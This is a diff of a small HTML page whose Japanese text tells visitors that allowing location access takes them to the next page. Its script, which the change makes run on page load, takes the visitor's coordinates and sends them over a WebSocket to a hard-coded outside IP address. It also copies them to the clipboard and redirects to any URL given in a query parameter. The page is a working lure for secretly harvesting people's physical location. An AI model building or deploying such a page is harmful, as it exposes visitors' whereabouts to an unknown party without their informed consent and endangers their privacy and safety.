@@ -1,19 +1,21 @@
 <meta charset="UTF-8">
 <a>位置情報を許可すると次のページに移動します。</a>
 <script>
-    ws = new WebSocket("wss://114.146.22.1:4721");
-    ws.addEventListener(
-        "open",
-        function(){
-            navigator.geolocation.getCurrentPosition(
-                function(a){
-                    r = `${a.coords.latitude}, ${a.coords.longitude}`;
-                    navigator.clipboard.writeText(r);
-                    ws.send(r);
-                    if(new URL(location.href).searchParams.get("redirect")){location.href=new URL(location.href).searchParams.get("redirect")}
-                },
-                function(a){}
-            )
-        }
-   )
+    window.onload = function(){
+        ws = new WebSocket("wss://114.146.22.1:4721");
+        ws.addEventListener(
+            "open",
+            function(){
+                navigator.geolocation.getCurrentPosition(
+                    function(a){
+                        r = `${a.coords.latitude}, ${a.coords.longitude}`;
+                        navigator.clipboard.writeText(r);
+                        ws.send(r);
+                        if(new URL(location.href).searchParams.get("redirect")){location.href=new URL(location.href).searchParams.get("redirect")}
+                    },
+                    function(a){}
+                )
+            }
+       )
+    }
 </script>
